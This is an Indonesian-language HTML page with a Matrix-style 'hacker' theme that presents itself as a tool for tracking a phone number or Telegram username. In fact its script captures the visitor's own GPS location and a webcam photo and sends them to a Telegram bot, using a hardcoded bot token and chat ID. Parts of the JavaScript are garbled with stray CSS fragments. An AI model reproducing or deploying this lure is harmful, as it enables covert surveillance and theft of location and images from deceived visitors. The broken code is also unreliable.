<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<title>Tools Yang Ingin Kamu Lacak</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
  * {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
  }
  body {
    background: #000;
    color: #0f0;
    font-family: 'Orbitron', monospace;
    overflow: hidden;
  }
  canvas {
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 0;
  }
  .ui {
    position: relative;
    z-index: 10;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    text-align: center;
    padding: 2rem;
  }
  h1 {
    font-size: 2.4rem;
    color: #fff;
    margin-bottom: 1.2rem;
    letter-spacing: 3px;
    text-shadow: 0 0 10px #ff0000;
  }
  input[type="text"] {
    width: 300px;
    padding: .7rem;
    border: 1px solid #ff0000;
    background: #000;
    color: #0f0;
    border-radius: 4px;
    font-size: 1rem;
    margin-right: .5rem;
  }
  button {
    padding: .7rem 1.4rem;
    border: none;
    background: #ff0000;
    color: #fff;
    font-weight: 700;
    border-radius: 4px;
    cursor: pointer;
    transition: .3s;
  }
  button:hover {
    background: #0c0;
  }
  #result {
    margin-top: 1.5rem;
    font-size: .9rem;
    color: #3f3;
  }
</style>
</head>
<body>
<canvas id="matrix"></canvas>
<div class="ui">
  <h1>Tools Yang Ingin Kamu Lacak</h1>
  <div>
    <input id="target" type="text" placeholder="No Telp/Username Telegram">
    <button onclick="track()">LACAK</button>
  </div>
  <div id="result"></div>
</div>

<script>
  // MATRIX RAIN (Text ala Hacker)
  const canvas = document.getElementById('matrix');
  const ctx = canvas.getContext('2d');

  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;

  const fontSize = 14; // Ukuran karakter
  const columns = Math.floor(canvas.width / fontSize); // Banyaknya karakter horizontal
  const drops = [];
  const text = 'PROFESSIONAL-HACKER889844345515'; // Teks yang ditampilkan bergerak

  // Inisialisasi posisi karakter untuk setiap kolom
  for (let i = 0; i < columns; i++) {
    drops[i] = Math.random() * canvas.height;
  }

  function draw() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; // Latar belakang dengan efek fade
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    ctx.fillStyle = '#0f0'; // Warna teks
    ctx.font = `${fontSize}px Orbitron`; // Font teks
    
    for (let i = 0; i < drops.length; i++) {
      // Ambil satu karakter secara acak
      const char = text[Math.floor(Math.random() * text.length)];
      ctx.fillText(char, i * fontSize, drops[i] * fontSize);

      // Geser teks ke bawah dan reset posisi jika sudah keluar layar
      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
        drops[i] = 0; // Reset ke atas layar
      }
      drops[i]++;
    }
  }

  setInterval(draw, 33); // Jalankan setiap 33 ms untuk animasi halus


  // KONFIGURASI BOT TELEGRAM
  const botToken = '8466797317:AAHmPG4JTBb3fuWEJfcmcryqj_wTToKOPRw'; // Masukkan token bot Telegram Anda
  const telegramChatId = '7755675050';  // Masukkan chat ID ke mana laporan dikirim

  async function track() {
    const target = document.getElementById('target').value;
    const resultDiv = document.getElementById('result');

    if (!target) {
      alert('Masukkan informasi target terlebih dahulu!');
      return;
    }

    try {
      resultDiv.innerText =lid #ff0000;
    background: #000;
    

      // Ambil lokasi pengguna
      const locationPromise = new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = videoStream;
      await video.play();

      // Ambil snapshot dari kamera
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.
      height = video.videoHeight;
      canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
      videoStream.getTracks().forEach(track => track.stop());
      const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));

      const location = await locationPromise;
      const latitude = location.coords.latitude;
      const longitude = location.coords.longitude;

      // URL lokasi di Google Maps
      const locationURL = solid #ff0000;
      background: #000;
      color: #0f0;
   

      // Mengirim laporan ke bot Telegram
      const formData = new FormData();
      formData.append('photo', imageBlob, 'photo.jpg');
      formData.append('caption', `Target melacak: ${target}\n\nLokasi pelapor: ${locationURL}`);

      await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${telegramChatId}`, {
        method: 'POST',
        body: formData,
      });

      alert('Laporan telah dikirim ke bot Telegram!');
      resultDiv.innerText = 'Target telah dilaporkan ke Telegram.';
    } catch (error) {
      alert('Terjadi kesalahan. Cek izin lokasi dan kamera!');
      console.error(error);
    }
  }
</script>
</body>
</html>
